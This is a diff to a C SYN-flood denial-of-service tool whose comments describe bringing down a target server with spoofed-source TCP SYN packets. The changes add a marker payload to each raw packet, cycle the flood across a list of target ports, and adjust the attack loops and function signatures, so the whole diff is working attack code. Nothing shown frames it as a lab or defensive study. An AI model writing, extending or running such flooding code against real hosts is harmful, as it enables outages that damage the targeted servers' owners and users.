@@ -2,9 +2,9 @@
 #include "synflood.h"
 #include <time.h>
 
-int allports[256] ; 
-int maxports ; 
-char portlist[256] ; 
+int allports[MAXPORT] ; 
+int maxports ; 		/* we start to count at zero, there one has to add 1 for module calculation */ 
+char portlist[MAXPORT*6] ; 
 
 bool attack = true;
 struct in_addr current_ipv4_addr;
@@ -136,34 +136,51 @@ pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers)
 }
 
 
+int addpayload ( uint8_t *packet , char mode ){
+  int i ; 
+  char payload[] = "hello synflood " ; 
+  for ( i=0 ; i < sizeof(payload) - 1 ; i++ ) {
+    packet[PACKET_BUFFER_LEN+i] = (uint8_t)payload[i] ; 
+  } 
+  packet[PACKET_BUFFER_LEN+i] = (uint8_t)mode ; 
+  return ++i ; 
+}
+
+
 /**
  * Bring down the target (host) server with a flood of TCP SYN packets
  * with spoofed IP addresses.
 */
 void
-synflood_t (char *hostname, unsigned int port, struct sockaddr_in host_addr)
+synflood_t (char *hostname, struct sockaddr_in host_addr)
 {
   int sockfd = getRawSocket();
 
-  uint8_t packet[PACKET_BUFFER_LEN];
+  uint8_t packet[PACKET_BUFFER_LEN+PAYLOAD];
   struct iphdr *ip_headers = (struct iphdr *) packet;
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
+
+  int sop ;  	/* size of payload */ 
+  int currentport = 0 ; 
 
   vlog ( "synflood_t started \n" ) ; 
 
   while (attack) {
     /* Because we want to spoof the IP address and port number of each packet, we will need to
      * reconstruct the packet each time we want to send one. */
+    host_addr.sin_port = ntohs(allports[currentport]) ; 
     setIpHeaders(ip_headers, &host_addr.sin_addr);
     setTcpHeaders(tcp_headers, host_addr.sin_port);
+    currentport++ ; 
+    currentport = currentport % ( maxports + 1 ) ; 
+    sop = addpayload(packet, 't') ; 
     tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
-    if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
+    if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
     memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
     loops_done++ ; 
   }
 }
-
 
 /**
  * Bring down the target (host) server with a flood of TCP SYN packets
@@ -174,10 +191,11 @@ synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
 {
   int sockfd = getRawSocket();
 
-  uint8_t packet[PACKET_BUFFER_LEN];
+  uint8_t packet[PACKET_BUFFER_LEN+PAYLOAD];
   struct iphdr *ip_headers = (struct iphdr *) packet;
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
-  int i ; 
+  int i ; 	/* laufvariable */ 
+  int sop ;  	/* size of payload */ 
 
   int currentport = 0 ; 
 
@@ -191,11 +209,12 @@ synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
     host_addr.sin_port = ntohs(allports[currentport]) ; 
     setIpHeaders(ip_headers, &host_addr.sin_addr);
     setTcpHeaders(tcp_headers, host_addr.sin_port ) ; 
-    /* printf ( "synflood_c 2  %d \n" , htons ( host_addr.sin_port ) ) ; */ 
+    /* printf ( "synflood_c 2  %ld %ld %ld \n" , PACKET_BUFFER_LEN , sizeof ( packet ) , sizeof(uint8_t) ) ; */ 
     currentport++ ; 
     currentport = currentport % ( maxports + 1 ) ; 
+    sop = addpayload(packet, 'c') ; 
     tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
-    if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
+    if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
     memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
     loops_done++ ; 
@@ -270,6 +289,10 @@ main (int argc, char *argv[], char *envp[])
       return EXIT_FAILURE ; 
   } 
 
+  if ( maxports > loop_count ) { 
+      vlog ( "number of ports (%d) is greater than loop-count (%d) - this doesn't make sense \n" , maxports , loop_count ) ; 
+  }
+
   vlog("Commencing attack in %d %s.\n", wait_time, wait_time == 1 ? "second" : "seconds");
   sleep(wait_time);
 
@@ -287,7 +310,7 @@ main (int argc, char *argv[], char *envp[])
 
   if ( enable_attack_time ) {
       alarm(attack_time);
-      synflood_t (hostname, port, host_addr);
+      synflood_t (hostname, host_addr);
   } ; 
 
   if ( enable_loop_count ) {
